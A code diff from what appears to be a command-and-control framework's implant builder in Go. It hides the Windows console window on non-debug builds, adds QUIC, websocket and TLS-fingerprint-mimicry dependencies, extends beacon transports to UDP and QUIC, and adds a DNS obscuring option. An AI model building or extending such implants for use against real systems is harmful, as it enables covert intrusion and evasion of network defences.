@@ -110,7 +110,7 @@ func buildLdflags(cfg ImplantConfig, profile MalleableProfile, goos string) (str
 	blob, sConfigKey := buildConfigBlobKeyed(cfg, profile)
 
 	flags := "-s -w -buildid="
-	if goos == "windows" {
+	if goos == "windows" && !cfg.Debug {
 		flags += " -H=windowsgui"
 	}
 	if cfg.SelfCheck {
@@ -190,9 +190,13 @@ func buildGoMod(goos string, isDLL bool) string {
 
 	deps := []string{}
 	deps = append(deps, "\tgolang.org/x/sys v0.46.0")
+	deps = append(deps, "\tgolang.org/x/crypto v0.53.0")
 
 	if !isDLL {
 		deps = append(deps, "\tgolang.org/x/net v0.56.0")
+		deps = append(deps, "\tgithub.com/gorilla/websocket v1.5.3")
+		deps = append(deps, "\tgithub.com/quic-go/quic-go v0.54.1")
+		deps = append(deps, "\tgithub.com/refraction-networking/utls v1.6.7")
 	}
 
 	if goos == "windows" {
@@ -693,7 +697,7 @@ type ImplantConfig struct {
 	WorkingEnd   string // HH:MM end of working hours (empty = disabled)
 	WorkingTZ    string // IANA timezone (empty = UTC)
 	// Advanced transport (injected as ldflags into agent)
-	BeaconTransport  string // http, wss, grpc, ssh, dns, tcp, icmp, mtls, h2c
+	BeaconTransport  string // http, wss, grpc, ssh, dns, tcp, icmp, mtls, h2c, udp, quic
 	DNSDoHURL        string
 	DNSDoTAddr       string
 	SSHUser          string
@@ -708,6 +712,7 @@ type ImplantConfig struct {
 	// at registration (encrypted under the same secret), keeping operational
 	// parameters off the disk artifact.
 	NetworkConfigOverWire bool
+	DNSObscure            bool
 }
 
 // forgeC2ModuleReplace returns a `replace` directive for the local
